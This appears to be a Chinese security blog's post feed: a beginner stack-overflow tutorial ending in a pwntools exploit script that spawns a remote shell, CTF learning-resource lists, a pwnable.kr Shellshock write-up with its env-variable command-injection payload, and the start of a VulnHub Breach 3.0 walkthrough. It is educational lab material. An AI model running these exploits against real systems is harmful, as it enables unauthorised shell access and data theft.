class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[----------------------------------registers-----------------------------------]<br>EAX: 0x3b (<span class="hljs-string">&#x27;;&#x27;</span>)<br>EBX: 0x0 <br>ECX: 0x0 <br>EDX: 0xf7fa7890 --&gt; 0x0 <br>ESI: 0xf7fa6000 --&gt; 0x1d5d8c <br>EDI: 0x0 <br>EBP: 0x2d414143 (<span class="hljs-string">&#x27;CAA-&#x27;</span>)<br>ESP: 0xffffd2c0 (<span class="hljs-string">&quot;ADAA;AA)AAEAAaAA0AAFAAbA\n&quot;</span>)<br>EIP: 0x41284141 (<span class="hljs-string">&#x27;AA(A&#x27;</span>)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>Invalid <span class="hljs-variable">$PC</span> address: 0x41284141<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd2c0 (<span class="hljs-string">&quot;ADAA;AA)AAEAAaAA0AAFAAbA\n&quot;</span>)<br>0004| 0xffffd2c4 (<span class="hljs-string">&quot;;AA)AAEAAaAA0AAFAAbA\n&quot;</span>)<br>0008| 0xffffd2c8 (<span class="hljs-string">&quot;AAEAAaAA0AAFAAbA\n&quot;</span>)<br>0012| 0xffffd2cc (<span class="hljs-string">&quot;AaAA0AAFAAbA\n&quot;</span>)<br>0016| 0xffffd2d0 (<span class="hljs-string">&quot;0AAFAAbA\n&quot;</span>)<br>0020| 0xffffd2d4 (<span class="hljs-string">&quot;AAbA\n&quot;</span>)<br>0024| 0xffffd2d8 --&gt; 0xa (<span class="hljs-string">&#x27;\n&#x27;</span>)<br>0028| 0xffffd2dc --&gt; 0xf7de99a1 (&lt;__libc_start_main+241&gt;:add    esp,0x10)<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x41284141 <span class="hljs-keyword">in</span> ?? ()<br></code></pre></td></tr></table></figure><p>说明此时程序已经崩溃，报错内容显示EIP中的地址是无效的，终端中显示的三栏依次显示的是程序崩溃时寄存器、错误代码、栈的相关信息，有关每个寄存器的作用在网上也有很多的介绍，我们要关注的是<code>EIP</code>寄存器，这个寄存器存储的是计算机要执行的下一个指令的位置，此时我们发现<code>EIP</code>中显示的是我们刚才输入的字符串中的一部分<code>AA(A</code>，我们先看一下这四个字符在字符串的位置，使用<code>pattern_offset</code>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ pattern_offset AA(A<br>AA(A found at offset: 22<br></code></pre></td></tr></table></figure><p>因此我们找到了这个字符串的偏移量为22，换个说法就是说我们输入的字符串在第22位会发生溢出，至此溢出点已被找到</p><ul><li><input checked="" disabled="" type="checkbox"> 确定溢出点</li></ul><p>就是说我们输入的前22个字符会正常的被程序处理，但是多出来的四个字节会覆盖在<code>EIP</code>寄存器中，如果我们把<code>EIP</code>中的内容修改为我们想执行的命令的位置，则可以执行此命令，如果我们想进一步掌控该程序需要寻找我们想执行的指令的位置。</p><h2 id="0x03-寻找目标指令"><a href="#0x03-寻找目标指令" class="headerlink" title="0x03 寻找目标指令"></a>0x03 寻找目标指令</h2><p>其实找到了溢出点之后利用时有很多种方式，但是这个题目只需要我们在程序本身中寻找利用点，我们回到IDA中查看是否有可以利用的指令，然后发现了一个<code>getshell</code>函数：</p><p><img src="https://i.loli.net/2018/09/28/5bade62d7af8c.png"></p><p>此函数的地址可以在下图中找到</p><p><img src="https://i.loli.net/2018/09/28/5bade68852d0e.png"></p><p>函数的地址为：<code>0804846B</code>如果我们把此<code>getshell</code>函数的入口地址放入<code>EIP</code>那么系统在执行<code>EIP</code>寄存器中的命令的时候就会直接运行<code>system(&quot;/bin/sh&quot;);</code>从而得到一个shell。</p><p>为了更贴近CTF中的情景，我们可以使用<code>socat</code>把此程序的标准<code>io</code>绑定到一个端口上从而实现远程通信：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat tcp-listen:10001,reuseaddr,fork EXEC:./hello,pty,raw<br></code></pre></td></tr></table></figure><p><del>端口号可以任意指定但是一定要是空闲端口号（废话）</del></p><p>然后就可以用<code>nc</code>来进行远程通信了如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc x.x.x.x port<br></code></pre></td></tr></table></figure><p>python中有一个大名鼎鼎的库叫做<code>pwntools</code>，我们用这个工具来与远程程序进行交互与破解，此库的安装教程网上也有而且不难，这里就不多说了，漏洞利用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#连接目标主机，参数为IP和端口</span><br>stream=remote(<span class="hljs-string">&#x27;x.x.x.x&#x27;</span>,<span class="hljs-number">10001</span>)<br><br><span class="hljs-comment">#payload即攻击载荷</span><br>payload=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#发送22个A并加上getshell函数的地址</span><br>payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">22</span>+p32(<span class="hljs-number">0x0804846B</span>)<br><br><span class="hljs-comment">#发送payload</span><br>stream.send(payload)<br><br><span class="hljs-comment">#打开一个shell的交互进程</span><br>stream.interactive()<br></code></pre></td></tr></table></figure><p>代码中p32()函数的作用是将函数地址转换为四个字节的字符串，如果不使用此函数直接发送22个A和0x0804846B则会直接发送16进制的字符而不是真正的地址的格式，运行此程序会发现程序由原来返回用户输入的名字变为了一个由交互功能的shell，可以执行用户输入的指令，到这里漏洞利用就算是成功了，当然，这个shell并不是标准的shell，可以利用python打开一个shell的完全体。</p><p><img src="https://i.loli.net/2018/09/28/5badf1bbc1064.png"></p><ul><li><input checked="" disabled="" type="checkbox"> 漏洞利用成功</li></ul><p>我在<code>hello</code>旁边放了一个<code>flag</code>，通过<code>cat flag</code>可以读取<code>flag</code>的内容，至此PWN结束。</p><p>本文章主要面对小白，省去了很多细节以方便理解，如有错误欢迎指正！</p>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
      <tag>栈溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息安全学习路径</title>
    <link href="/2018/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/"/>
    <url>/2018/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/</url>
    
    <content type="html"><![CDATA[<h2 id="WEB安全"><a href="#WEB安全" class="headerlink" title="WEB安全"></a>WEB安全</h2><h3 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h3><p>C&amp;C++</p><p>Python</p><p>PHP</p><p>HTML</p><p>JavaScript</p><span id="more"></span><h3 id="常见WEB漏洞"><a href="#常见WEB漏洞" class="headerlink" title="常见WEB漏洞"></a>常见WEB漏洞</h3><p>SQL注入</p><p>暴力破解</p><p>文件上传漏洞</p><p>文件包含漏洞</p><p>XSS漏洞</p><p>CSRF漏洞</p><p>（OWASP TOP 10）</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>Kali Linux</p><p>FTP</p><p>SSH</p><p>NetCat</p><p>WireShark</p><p>DNS Lookup</p><p>ShoDan</p><p>RECON-NG</p><p>BurpSuite</p><p>Nmap</p><p>Nessues</p><p>AWVS</p><p>SQLMap</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>计算机网络</p><p>WEB中间件安全</p><p>逻辑漏洞</p><p>数据库</p><p>防火墙</p><p>代理</p><p>内网穿透</p><p>身份认证与会话管理</p><p>提权</p><p>Google高级搜索</p><p>HTTP协议</p><p>隐藏痕迹&amp;销毁数据</p><p>常见的加密解密原理</p><p>敏感信息泄露</p><p>无线网络安全（可选）</p><p>工业系统安全（可选）</p><h3 id="靶机-amp-练手网站"><a href="#靶机-amp-练手网站" class="headerlink" title="靶机&amp;练手网站"></a>靶机&amp;练手网站</h3><p>metasploitable</p><p>bwapp</p><p>在线练习平台合集：<a href="https://www.cnblogs.com/hotboy/p/6396387.html">https://www.cnblogs.com/hotboy/p/6396387.html</a></p><p><strong>ctf综合练习：</strong></p><p>1、网络安全实验室 网络信息安全攻防学习平台</p><p>2、光棍节程序员闯关秀第1关(总共10关) 光棍节程序员闯关秀</p><p>3、黑客游戏–Hackers game 黑客丛林之旅</p><p>4、梦之光芒&#x2F;Monyer——Monyer’s Little Game 梦之光芒的小游戏</p><p>5、XCTF_OJ竞赛平台 XCTF_OJ练习平台</p><p>6、黑客游戏 Let’s Hack 习科黑客游戏</p><p>7、Jlu.CTF首页 Jlu.CTF</p><p>8、白帽学院 白帽学院ctf挑战赛</p><p>9、在线挑战_  i春秋学院信息安全体验中心 i春秋ctf挑战</p><p>10、IDF实验室 CTF训练营 idf 实验室</p><p>11、欢迎参加比赛~ 米安网ctf</p><p>12、合天网安实验室-CTF挑战赛 合天ctf</p><p>13、ctf夺旗训练_CTF训练营 实验吧(前名西普学院）</p><p>14、黑吧安全网-红客闯关游戏 黑吧安全网-红客闯关游戏</p><h3 id="渗透测试方法"><a href="#渗透测试方法" class="headerlink" title="渗透测试方法"></a>渗透测试方法</h3><p>被动信息收集</p><p>主动信息收集</p><p>威胁建模与漏洞分析</p><p>安全测试以及测试报告</p><h2 id="知道创宇研发技能表"><a href="#知道创宇研发技能表" class="headerlink" title="知道创宇研发技能表"></a>知道创宇研发技能表</h2><p><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/">http://blog.knownsec.com/Knownsec_RD_Checklist/</a></p>]]></content>
    
    
    <categories>
      
      <category>信息安全学习路径</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息安全-CTF学习指南及资料分享</title>
    <link href="/2018/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8-CTF%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97%E5%8F%8A%E8%B5%84%E6%96%99%E5%88%86%E4%BA%AB/"/>
    <url>/2018/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8-CTF%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97%E5%8F%8A%E8%B5%84%E6%96%99%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[<p>信息安全知识面十分广，涉及的方向也很多，很多同学学起来信息安全的知识经常会找不到方向，<br>因此我们把CTF（微观而全面的信安知识竞赛）作为主要的学习方向。</p><p>在这里我把学习方向分为两个大类，一个是网络安全方向，一个是二进制安全。<br>对于信息安全知识的学习路径，知道创宇有一个十分十分十分详细的技能表：<a href="http://blog.knownsec.com/Knownsec_RD_Checklist/">http://blog.knownsec.com/Knownsec_RD_Checklist/</a>，内容较多，建议大家都看一下。</p><p>下面分享一个安全行业从事人员的网站导航：<a href="https://www.shentoushi.top/">https://www.shentoushi.top/</a>，<br>这个网站上面有很多常用的学习网站、在线漏洞学习和安全工具。</p><span id="more"></span><h2 id="渗透测试、WEB安全、网络攻防"><a href="#渗透测试、WEB安全、网络攻防" class="headerlink" title="渗透测试、WEB安全、网络攻防"></a>渗透测试、WEB安全、网络攻防</h2><p>入门难度⭐⭐</p><p>进阶难度⭐⭐⭐</p><p>就业前景⭐⭐⭐⭐⭐</p><p><strong>推荐网站：</strong></p><ul><li>Freebuf 帮助你建立起安全圈的“世界观”: <a href="http://www.freebuf.com/">http://www.freebuf.com</a></li><li>安全牛课堂 <a href="https://edu.aqniu.com/classroom/119/courses">https://edu.aqniu.com/classroom/119/courses</a>（上面的课收费但是有免费开通收费课程包的活动，开学之后注意留意技协群内公告以免错过活动）</li><li>i春秋：<a href="https://www.ichunqiu.com/">https://www.ichunqiu.com/</a></li><li>实验吧：<a href="http://www.shiyanbar.com/">http://www.shiyanbar.com/</a></li></ul><p><strong>网盘资料：</strong></p><p>工具分享：</p><ul><li>webug虚拟机靶机：链接：<a href="https://pan.baidu.com/s/1poHqU0r58IK42F9TIdpkrA">https://pan.baidu.com/s/1poHqU0r58IK42F9TIdpkrA</a> 密码：urw6</li></ul><h2 id="二进制安全、软件逆向、PWN"><a href="#二进制安全、软件逆向、PWN" class="headerlink" title="二进制安全、软件逆向、PWN"></a>二进制安全、软件逆向、PWN</h2><p>入门难度⭐⭐⭐⭐</p><p>进阶难度⭐⭐⭐⭐⭐</p><p>就业前景⭐⭐⭐⭐⭐</p><p><strong>推荐网站：</strong></p><ul><li>看雪论坛：<a href="https://bbs.pediy.com/">https://bbs.pediy.com/</a></li><li>吾爱破解：<a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a></li><li>PWN题目的整理：<a href="http://bestwing.me/PWNABLE/">http://bestwing.me/PWNABLE/</a></li></ul><p><strong>网盘资料：</strong></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><strong>综合网站推荐：</strong></p><p>漏洞练习平台汇总：<a href="https://www.cnblogs.com/hotboy/p/6396387.html">https://www.cnblogs.com/hotboy/p/6396387.html</a></p><p>各种信息安全相关思维导图：<a href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a></p><p>漏洞银行：<a href="https://www.bugbank.cn/live/">https://www.bugbank.cn/live/</a> 上面有很多可以入门的课</p><p>一个简单有趣的web演练靶场：<a href="http://solveme.peng.kr/chall">http://solveme.peng.kr/chall</a></p>]]></content>
    
    
    <categories>
      
      <category>信息安全学习路径</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellshock-writeup-pwnabble.kr-shell的漏洞</title>
    <link href="/2018/09/shellshock-writeup-pwnabble-kr-shell%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/09/shellshock-writeup-pwnabble-kr-shell%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>题面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mommy, there was a shocking news about bash.<br>I bet you already know, but lets just make it sure :)<br><br>ssh shellshock@pwnable.kr -p2222 (pw:guest)<br></code></pre></td></tr></table></figure><p>文件目录及权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">shellshock@ubuntu:~$ <span class="hljs-built_in">ls</span> -l<br>total 960<br>-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash<br>-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag<br>-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br>-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c<br></code></pre></td></tr></table></figure><span id="more"></span><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">shellshock@ubuntu:~$ cat shellshock.c<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>        setresuid(getegid(), getegid(), getegid());<br>        setresgid(getegid(), getegid(), getegid());<br>        system(<span class="hljs-string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>一看是shocking news，肯定是什么重大新闻比如曝出的严重漏洞，搜一下<code>bash 漏洞</code>果然发现了漏洞<a href="https://zhangge.net/4479.html">bash漏洞</a></p><p>里面说到:<code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code>如果输出为echo后面的内容即代表存在此漏洞，这就好办了，可以直接cat flag了</p><p>POC&amp;flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">shellshock@ubuntu:~$ <span class="hljs-built_in">env</span> x=<span class="hljs-string">&#x27;() &#123; :;&#125;; /bin/cat flag&#x27;</span> bash -c <span class="hljs-string">&quot;./shellshock&quot;</span><br>only <span class="hljs-keyword">if</span> I knew CVE-2014-6271 ten years ago..!!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Breach3.0靶机渗透记录</title>
    <link href="/2018/09/Breach3-0%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/"/>
    <url>/2018/09/Breach3-0%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://www.vulnhub.com/entry/breach-301,177/">https://www.vulnhub.com/entry/breach-301,177/</a></p><p>下载好靶机文件之后需要先把文件后缀改为ova，把之前的“.”去掉，然后用Vmware打开此文件导入虚拟机，等待虚拟机导入完毕，将网络设置为NAT并设置DHCP服务器，使靶机能自动获取IP地址，然后开启虚拟机。</p><p>虚拟机打开之后会显示自动配置网络设置，靶机系统是Ubuntu14.04，靶机成功启动之后查看虚拟机网卡的网段，然后使用nmap进行这一网段的ping扫描来确定存活主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sn 192.168.229.0/24<br></code></pre></td></tr></table></figure><span id="more"></span><p>扫描结果显示有两台存活主机，一台是我的kali虚拟机（192.168.229.128），另一台应该就是靶机了，靶机的IP地址为<code>192.168.229.128</code></p><p>下一步是继续对靶机进行信息收集，还是用nmap扫一下开放的端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -v 192.168.229.129<br></code></pre></td></tr></table></figure><p>结果显示一个TCP端口都没有，奇了怪了，没入口怎么破，于是又扫了一下UDP端口的开放情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  ~  nmap -sS -sU -T4 -A -v 192.168.229.129<br>Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-19 09:21 EDT<br>NSE: Loaded 148 scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 09:21<br>Completed NSE at 09:21, 0.00s elapsed<br>Initiating NSE at 09:21<br>Completed NSE at 09:21, 0.00s elapsed<br>Initiating ARP Ping Scan at 09:21<br>Scanning 192.168.229.129 [1 port]<br>Completed ARP Ping Scan at 09:21, 0.03s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 09:21<br>Completed Parallel DNS resolution of 1 host. at 09:21, 0.01s elapsed<br>Initiating SYN Stealth Scan at 09:21<br>Scanning 192.168.229.129 [1000 ports]<br>Completed SYN Stealth Scan at 09:21, 21.53s elapsed (1000 total ports)<br>Initiating UDP Scan at 09:21<br>Scanning 192.168.229.129 [1000 ports]<br>Discovered open port 161/udp on 192.168.229.129<br>Completed UDP Scan at 09:22, 10.01s elapsed (1000 total ports)<br>Initiating Service scan at 09:22<br>Scanning 1000 services on 192.168.229.129<br>Service scan Timing: About 0.40% <span class="hljs-keyword">done</span><br>Service scan Timing: About 3.20% <span class="hljs-keyword">done</span>; ETC: 11:03 (1:38:19 remaining)<br>Service scan Timing: About 6.20% <span class="hljs-keyword">done</span>; ETC: 10:40 (1:13:53 remaining)<br>Service scan Timing: About 9.20% <span class="hljs-keyword">done</span>; ETC: 10:32 (1:04:09 remaining)<br>Service scan Timing: About 12.20% <span class="hljs-keyword">done</span>; ETC: 10:28 (0:58:32 remaining)<br>Service scan Timing: About 15.20% <span class="hljs-keyword">done</span>; ETC: 10:26 (0:54:29 remaining)<br>Service scan Timing: About 18.20% <span class="hljs-keyword">done</span>; ETC: 10:24 (0:51:10 remaining)<br>Service scan Timing: About 23.50% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:42:39 remaining)<br>Service scan Timing: About 24.20% <span class="hljs-keyword">done</span>; ETC: 10:22 (0:45:50 remaining)<br>Service scan Timing: About 29.40% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:39:16 remaining)<br>Service scan Timing: About 35.40% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:35:46 remaining)<br>Service scan Timing: About 41.40% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:32:21 remaining)<br>Service scan Timing: About 47.40% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:28:59 remaining)<br>Service scan Timing: About 53.40% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:25:38 remaining)<br>Service scan Timing: About 59.40% <span class="hljs-keyword">done</span>; ETC: 10:16 (0:22:18 remaining)<br>Service scan Timing: About 65.40% <span class="hljs-keyword">done</span>; ETC: 10:16 (0:18:59 remaining)<br>Service scan Timing: About 71.40% <span class="hljs-keyword">done</span>; ETC: 10:16 (0:15:41 remaining)<br>Service scan Timing: About 77.40% <span class="hljs-keyword">done</span>; ETC: 10:16 (0:12:23 remaining)<br>Service scan Timing: About 83.40% <span class="hljs-keyword">done</span>; ETC: 10:16 (0:09:05 remaining)<br>Service scan Timing: About 88.90% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:06:06 remaining)<br>Service scan Timing: About 94.90% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:02:48 remaining)<br>Completed Service scan at 10:17, 3319.00s elapsed (1000 services on 1 host)<br>Initiating OS detection (try <span class="hljs-comment">#1) against 192.168.229.129</span><br>Retrying OS detection (try <span class="hljs-comment">#2) against 192.168.229.129</span><br>NSE: Script scanning 192.168.229.129.<br>Initiating NSE at 10:17<br>Completed NSE at 10:18, 45.22s elapsed<br>Initiating NSE at 10:18<br>Completed NSE at 10:19, 55.12s elapsed<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.229.129<br>Host is up (0.0042s latency).<br>Not shown: 1000 filtered ports, 999 open|filtered ports<br>PORT    STATE SERVICE VERSION<br>161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)<br>| snmp-info: <br>|   enterprise: net-snmp<br>|   engineIDFormat: unknown<br>|   engineIDData: ad610f2abb4d5b5800000000<br>|   snmpEngineBoots: 19<br>|_  snmpEngineTime: 1h08m06s<br>| snmp-sysdescr: Linux Initech-DMZ01 4.4.0-45-generic <span class="hljs-comment">#66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64</span><br>|_  System <span class="hljs-built_in">uptime</span>: 1h08m7.02s (408702 timeticks)<br>MAC Address: 00:0C:29:76:41:E4 (VMware)<br>Too many fingerprints match this host to give specific OS details<br>Network Distance: 1 hop<br>Service Info: Host: Initech-DMZ01<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   4.20 ms 192.168.229.129<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 10:19<br>Completed NSE at 10:19, 0.00s elapsed<br>Initiating NSE at 10:19<br>Completed NSE at 10:19, 0.00s elapsed<br>Read data files from: /usr/bin/../share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3455.13 seconds<br>           Raw packets sent: 4049 (152.554KB) | Rcvd: 3 (308B)<br></code></pre></td></tr></table></figure><p>发现只有161端口是开着的，运行了SNMP服务，做到这里想到获取此端口上暴漏的信息，于是百度有关snmp的命令，结果没什么收获，只是知道有GET方法，于是在kali中输入snmp+tab</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  ~  snmp<br>snmp-bridge-mib  snmp-check       snmpget          snmpset          snmptrap       <br>snmpbulkget      snmpconf         snmpgetnext      snmpstatus       snmpusm        <br>snmpbulkwalk     snmpd            snmpinform       snmptable        snmpvacm       <br>snmpc            snmpdelta        snmpkey          snmptest         snmpwalk       <br>snmpcheck        snmpdf           snmpnetstat      snmptranslate<br></code></pre></td></tr></table></figure><p>发现了与GET命令相关的命令<code>snmpget</code>于是尝试一波,发现如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  ~  snmpget 192.168.229.129      <br>snmp-check v1.9 - SNMP enumerator<br>Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)<br><br>[+] Try to connect to 192.168.229.129:161 using SNMPv1 and community <span class="hljs-string">&#x27;public&#x27;</span><br><br>[*] System information:<br><br>  Host IP address               : 192.168.229.129<br>  Hostname                      : Initech-DMZ01<br>  Description                   : Linux Initech-DMZ01 4.4.0-45-generic <span class="hljs-comment">#66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64</span><br>  Contact                       : Email: Milton@breach.local - (545)-232-1876<br>  Location                      : Initech - is this thing on? I doubt anyone thinks to look here, anyways, I<span class="hljs-string">&#x27;ve left myself a way back in and burn the place down once again.</span><br><span class="hljs-string">  Uptime snmp                   : 15:12:39.80</span><br><span class="hljs-string">  Uptime system                 : 15:12:23.84</span><br><span class="hljs-string">  System date                   : 2018-9-20 00:21:49.0</span><br></code></pre></td></tr></table></figure><p>“这东西是开着的吗？我怀疑任何人都会想看看这里，不管怎样，我给自己留了一条路，再一次烧毁了这个地方。”，这里说出题人在这里留了后门，他离开的时候就会把后门给烧毁（破坏），其实这是个坑，因为只靠这一个端口很难继续进行下去，而且出题者说了留下了后门，那这里一定是有可以打开部分TCP端口的方法的，于是我找到了端口敲门服务<a 